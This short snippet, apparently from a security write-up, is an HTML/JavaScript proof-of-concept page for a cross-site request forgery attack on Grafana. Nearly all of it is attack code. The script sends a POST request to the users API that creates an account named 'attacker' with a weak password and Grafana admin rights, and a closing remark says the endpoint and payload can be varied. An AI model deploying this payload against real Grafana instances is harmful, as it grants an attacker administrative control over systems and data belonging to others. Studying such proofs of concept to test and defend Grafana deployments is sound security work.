Example HTML/JavaScript for a CSRF POST request:
```html
<html>
<body>
<script>
  fetch('<TARGET_URL>/api/v1/users', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      'name': 'attacker-user',
      'email': 'attacker@example.com',
      'login': 'attacker',
      'password': 'insecurepassword',
      'isGrafanaAdmin': true
    })
  }).then(response => {
    console.log('Request sent:', response);
  }).catch(error => {
    console.error('Error sending request:', error);
  });
</script>
</body>
</html>
```
(Note: The exact endpoint and payload will vary based on the desired action and Grafana API.)

